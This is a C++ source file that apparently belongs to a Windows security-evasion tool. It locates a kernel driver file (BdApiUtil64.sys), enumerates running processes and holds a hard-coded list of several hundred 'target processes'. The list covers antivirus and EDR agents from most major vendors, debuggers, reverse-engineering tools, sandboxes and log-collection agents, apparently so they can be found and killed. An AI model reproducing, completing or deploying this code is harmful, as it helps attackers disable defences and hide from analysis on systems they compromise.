#include "utils.h"
#include <tlhelp32.h>
#include <iostream>
#include <algorithm>
#include <cctype>

std::string GetExecutableDirectory() {
    char path[MAX_PATH];
    GetModuleFileNameA(nullptr, path, MAX_PATH);
    
    std::string fullPath(path);
    size_t lastSlash = fullPath.find_last_of("\\/");
    if (lastSlash != std::string::npos) {
        return fullPath.substr(0, lastSlash);
    }
    return ".";
}

std::string GetDriverPath() {
    return GetExecutableDirectory() + "\\BdApiUtil64.sys";
}

static std::vector<ProcessEntry> g_processCache;
static DWORD g_lastCacheUpdate = 0;
static const DWORD CACHE_TIMEOUT = 1000; 

void UpdateProcessCache() {
    DWORD currentTime = GetTickCount();
    if (currentTime - g_lastCacheUpdate < CACHE_TIMEOUT && !g_processCache.empty()) {
        return; 
    }
    
    g_processCache.clear();
    g_processCache.reserve(500); 
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(snapshot, &pe32)) {
        do {
            ProcessEntry entry;
            entry.processID = pe32.th32ProcessID;
            entry.exeFile = pe32.szExeFile;
            std::transform(entry.exeFile.begin(), entry.exeFile.end(), entry.exeFile.begin(), ::tolower);
            g_processCache.push_back(std::move(entry));
        } while (Process32Next(snapshot, &pe32));
    }
    
    CloseHandle(snapshot);
    g_lastCacheUpdate = currentTime;
}

DWORD GetProcessIdByName(const std::string& processName) {
    UpdateProcessCache();
    
    std::string targetName = processName;
    std::transform(targetName.begin(), targetName.end(), targetName.begin(), ::tolower);
    
    for (const auto& entry : g_processCache) {
        if (entry.exeFile == targetName) {
            return entry.processID;
        }
    }
    
    return 0;
}

std::vector<ProcessEntry> EnumerateProcesses() {
    UpdateProcessCache();
    return g_processCache;
}

std::vector<std::string> GetTargetProcesses() {
    static std::vector<std::string> targetProcesses = {
        "MsMpEng.exe", "MpCmdRun.exe", "NisSrv.exe", "SecurityHealthSystray.exe",
        "SecurityHealthService.exe", "SgrmBroker.exe", "MpDefenderCoreService.exe",
        "smartscreen.exe", "msmpeng.exe", "CSFalconService.exe", "CSFalconContainer.exe",
        "falcon-sensor.exe", "CSAuth.exe", "CSDeviceControl.exe", "CSFalconHost.exe",
        "cs-winserver.exe", "SentinelAgent.exe", "SentinelHelperService.exe",
        "SentinelServiceHost.exe", "SentinelAgentWorker.exe", "SentinelBrowserExtensionHost.exe",
        "SentinelCtl.exe", "SentinelStaticEngine.exe", "LogProcessorService.exe",
        "cb.exe", "cbcomms.exe", "cbstream.exe", "confer.exe", "RepMgr.exe",
        "CbDefense.exe", "cbagent.exe", "CbOsxSensorService.exe", "carbonblack.exe",
        "ccSvcHst.exe", "NortonSecurity.exe", "ProtectionUtilSurrogate.exe",
        "SepMasterService.exe", "SmcService.exe", "SNAC64.exe", "smc.exe",
        "SmcGui.exe", "ccApp.exe", "rtvscan.exe", "DefWatch.exe", "Rtvscan.exe",
        "navapsvc.exe", "NAVAPSVC.exe", "navapw32.exe", "Norton_Security.exe",
        "nis.exe", "nisum.exe", "nsWscSvc.exe", "Norton360.exe", "McAPExe.exe",
        "mfefire.exe", "mfemms.exe", "mfevtp.exe", "ModuleCoreService.exe",
        "PEFService.exe", "ProtectedModuleHost.exe", "masvc.exe", "mcagent.exe",
        "naPrdMgr.exe", "firesvc.exe", "mfeann.exe", "mcshield.exe", "vstskmgr.exe",
        "engineserver.exe", "mfevtps.exe", "mfecanary.exe", "HipShieldK.exe",
        "MfeEpeHost.exe", "MfeAVSvc.exe", "mcuimgr.exe", "EPOAgent.exe",
        "PccNTMon.exe", "TMBMSRV.exe", "TmCCSF.exe", "TMLWfMgr.exe", "TmPfw.exe",
        "TmProxy.exe", "TmWSWSvc.exe", "UfSeAgnt.exe", "TmListen.exe", "TmPreFilter.exe",
        "coreServiceShell.exe", "CoreFrameworkHost.exe", "TrendMicroDFLauncher.exe",
        "ApexOne.exe", "TrendMicro.exe", "TrendMicroSecurity.exe", "CCSF.exe",
        "NTRTScan.exe", "tmlisten.exe", "CNTAoSMgr.exe", "TmESMgr.exe", "TMBMServer.exe",
        "avp.exe", "avpui.exe", "klnagent.exe", "vapm.exe", "KAVFS.exe", "kavtray.exe",
        "kavstart.exe", "avpsus.exe", "kav.exe", "kavss.exe", "kavpfprc.exe",
        "klbackupapl.exe", "klwtblfs.exe", "ksde.exe", "ksdeui.exe", "klcsrv.exe",
        "klswd.exe", "klnagent64.exe", "ekrn.exe", "egui.exe", "eelam.exe",
        "eamonm.exe", "eguiProxy.exe", "ehdrv.exe", "EHttpSrv.exe", "ekrnEpfw.exe",
        "ESCANMON.exe", "eShield.exe", "ERAAgentSvc.exe", "ERAAgent.exe",
        "escanpro.exe", "esets_daemon.exe", "eset_service.exe", "bdagent.exe",
        "bdwtxag.exe", "vsserv.exe", "update.exe", "bdservicehost.exe", "bdntwrk.exe",
        "bdss.exe", "bdredline.exe", "bdreinit.exe", "bdselfpr.exe", "bdsubwiz.exe",
        "bdsubmitwiz.exe", "BDReinit.exe", "psimreal.exe", "livesrv.exe",
        "bdapppassmgr.exe", "ProductAgentService.exe", "bdparentalservice.exe",
        "atc.exe", "HuntressAgent.exe", "mbamservice.exe", "mbamtray.exe", "mbam.exe",
        "MBAMProtector.exe", "MBAMService.exe", "MBAMWebProtection.exe",
        "mbamscheduler.exe", "mbae.exe", "mbae-svc.exe", "mbae-setup.exe",
        "mbamdor.exe", "mbampt.exe", "malwarebytes_assistant.exe", "AvastSvc.exe",
        "AvastUI.exe", "aswidsagent.exe", "avgui.exe", "avgsvc.exe", "aswEngSrv.exe",
        "avastui.exe", "avastsvc.exe", "aswupdsv.exe", "aswFe.exe", "aswidsagenta.exe",
        "aswrdr2.exe", "aswRdr.exe", "aswRvrt.exe", "aswKbd.exe", "aswWebRepIE.exe",
        "avgfws.exe", "avgidsagent.exe", "AVGSvc.exe", "avgwdsvc.exe", "avgcsrva.exe",
        "avgcsrvx.exe", "xagt.exe", "fsdfw.exe", "fsdfwd.exe", "FireEyeEndpointService.exe",
        "HxTsr.exe", "xagtnotif.exe", "fe_avira.exe", "feedbacksender.exe",
        "fireeye.exe", "xagt_service.exe", "CylanceSvc.exe", "CyUpdate.exe",
        "CylanceUI.exe", "CyOptics.exe", "CyOpticsService.exe", "cylancedx64.exe",
        "CylanceDrv64.exe", "CylanceMemDef64.exe", "WRSA.exe", "WRSkyClient.exe",
        "WRCore.exe", "WRConsumerService.exe", "WRSVC.exe", "WebrootSecureAnywhere.exe",
        "WRUpgradeSvc.exe", "WRkrn.exe", "wrhelper.exe", "ALsvc.exe",
        "SAVAdminService.exe", "SavService.exe", "swi_service.exe", "wscsvc.exe",
        "sophosfs.exe", "SophosCleanupTool.exe", "SAVService.exe", "swi_filter.exe",
        "swc_service.exe", "swi_fc.exe", "SophosUI.exe", "SophosFileScanner.exe",
        "SophosHealthService.exe", "SophosNtpService.exe", "SophosNetFilter.exe",
        "SophosSafestore64.exe", "SophosEndpointDefense.exe", "HitmanPro.exe",
        "HitmanPro.Alert.exe", "hmpalert.exe", "cpda.exe", "ZoneAlarm.exe",
        "zlclient.exe", "zonealarm.exe", "vsmon.exe", "zatray.exe", "CheckPointAV.exe",
        "cpda_svc.exe", "cpdaemon.exe", "fsav.exe", "fsgk32st.exe", "fsma32.exe",
        "fshdll32.exe", "fssm32.exe", "fnrb32.exe", "fsav32.exe", "fsgk32.exe",
        "fshoster32.exe", "fsguiexe.exe", "fsuninst.exe", "fs_ccf.exe", "fspex.exe",
        "fsqh.exe", "fswp.exe", /*"AVK.exe",*/ "AVKProxy.exe", "AVKService.exe",
        "AVKWCtl.exe", "GdScan.exe", "gdsc.exe", "GDFirewallTray.exe", "GdBgInx64.exe",
        "AVKRes.exe", "AVKTray.exe", "PSANHost.exe", "PSUAConsole.exe", "PSUAMain.exe",
        "PSUAService.exe", "PavFnSvr.exe", "Pavsrv51.exe", "PavPrSrv.exe",
        "AVENGINE.exe", "PandaAntivirus.exe", "pandatray.exe", "PandaService.exe",
        "FortiClient.exe", "FCDBLog.exe", "FortiProxy.exe", "FortiESNAC.exe",
        "FortiSettings.exe", "FortiTray.exe", "FCAppDb.exe", "FCConfig.exe",
        "FCHelpDB.exe", "FCSAConnector.exe", "FCHookDll.exe", "FCCrypto.exe",
        "cmdagent.exe", "cavwp.exe", "cfp.exe", "cmdvirth.exe", "CisSvc.exe",
        "CisTray.exe", "cmdlineparser.exe", "cis.exe", "cistray.exe", "cfpconfg.exe",
        "cfplogvw.exe", "cfpupdat.exe", "cytray.exe", "cyserver.exe", "CyveraService.exe",
        "cyoptics.exe", "cytool.exe", "cyupdate.exe", "CyveraConsole.exe",
        "cortex.exe", "traps.exe", "msseces.exe", "MSASCui.exe", "MSASCuiL.exe",
        "ForefrontEndpointProtection.exe", "ProcessHacker.exe", "procexp.exe",
        "procexp64.exe", "procmon.exe", "procmon64.exe", "WinAPIOverride.exe",
        "apimonitor.exe", "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "windbg.exe",
        "idaq.exe", "idaq64.exe", "idaw.exe", "idaw64.exe", "scylla.exe",
        "scylla_x64.exe", "pestudio.exe", "LordPE.exe", "SysAnalyzer.exe",
        "sniff_hit.exe", "winpooch.exe", "ZwClose.exe", "ZwSetInformationThread.exe",
        "ExtremeDumper.exe", "peid.exe", "ImportREC.exe", "IMMUNITYDEBUGGER.exe",
        "MegaDumper.exe", "StringsGUI.exe", "Wireshark.exe", "tcpview.exe",
        "autoruns.exe", "autorunsc.exe", "filemon.exe", "regmon.exe", "PEiD.exe",
        "SysInspector.exe", "proc_analyzer.exe", "sysinfo.exe", "joeboxcontrol.exe",
        "joeboxserver.exe", "ResourceHacker.exe", "x64NetDumper.exe", "Fiddler.exe",
        "httpdebugger.exe", "Cff Explorer.exe", "Sysinternals.exe", "inlinehook.exe",
        "AntiXen.exe", "SbieSvc.exe", "SbieCtrl.exe", "SandboxieRpcSs.exe",
        "SandboxieCrypto.exe", "SandboxieDcomLaunch.exe", "SandboxieBITS.exe",
        "SandboxieLogon.exe", "SandboxieLsa.exe", "elastic-agent.exe",
        "elastic-endpoint.exe", "winlogbeat.exe", "filebeat.exe", "packetbeat.exe",
        "metricbeat.exe", "heartbeat.exe", "osqueryi.exe", "osqueryd.exe",
        "velociraptor.exe", "wazuh-agent.exe", "OrcAgentSvc.exe", "orcagent.exe",
        "WinCollect.exe", "nxlog.exe", "splunk.exe", "splunkd.exe", "splunk-admon.exe",
        "splunk-winevtlog.exe", "splunk-regmon.exe", "splunk-netmon.exe",
        "UniversalAgent.exe", "CSAgent.exe", "CSFalcon.exe", "qualys.exe",
        "QualysAgent.exe", "BeyondTrust.exe", "BeyondTrustAgent.exe", "CyberArkAgent.exe",
        "CyberArk.exe", "TaniumClient.exe", "TaniumDetectEngine.exe", "TaniumCX.exe",
        "TaniumTraceEngine.exe", "TaniumEndpointIndex.exe", "TaniumDetect.exe",
        "TaniumThreatResponse.exe", "RedCanary.exe", "RedCanaryAgent.exe", "redcanaryd.exe",
        "DarktraceAgent.exe", "darktrace.exe", "DarktraceSensor.exe", "LimaCharlie.exe",
        "rphcp.exe", "rpHCP_HostBasedSensor.exe", "CynetEPS.exe", "cynet.exe",
        "CynetMonitor.exe", "DeepInstinct.exe", "DeepInstinctAgent.exe", "DI_Host.exe",
        "esensor.exe", "elastic-endpoint-security.exe", "endgame.exe"
    };
    
    return targetProcesses;
}